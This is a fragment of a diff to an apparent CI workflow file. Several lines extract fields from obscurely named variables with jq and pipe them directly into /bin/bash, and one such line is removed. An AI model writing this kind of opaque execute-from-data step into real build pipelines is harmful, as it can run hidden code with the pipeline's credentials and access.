@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$d3908" | jq -r .qna54 | /bin/bash
           printf '%s' "$mck679" | jq -r .duueh1381 | /bin/bash
           echo $ik64 | jq -r .i27 | /bin/bash
-          printf '%s' "$rug4" | jq -r .ruc93800 | /bin/bash
           printf '%s' "$nptu09072" | jq -r .oai7310 | /bin/bash
 
       - name: Upload data
